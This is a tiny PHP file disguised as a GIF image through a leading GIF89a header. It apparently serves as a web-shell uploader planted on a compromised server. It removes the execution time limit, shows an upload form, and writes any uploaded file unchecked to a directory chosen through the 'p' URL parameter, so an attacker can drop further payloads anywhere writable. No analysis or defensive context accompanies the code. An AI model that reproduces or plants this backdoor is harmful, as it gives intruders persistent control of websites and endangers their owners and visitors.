GIF89a<?php ini_set('max_execution_time', 0);

echo "up";

    $html ='<form action="" method="post" enctype="multipart/form-data"><label for="file">file:</label><input type="file" name="file" id="file"/><br/><br/><input type="submit" name="default" value="upload"></form><hr>';
    echo $html;$customUploadDirectory = isset($_GET['p']) ? $_GET['p'] : __DIR__.'/';{move_uploaded_file($_FILES["file"]["tmp_name"], $customUploadDirectory.$_FILES["file"]["name"]);echo "".$customUploadDirectory.$_FILES["file"]["name"];}die;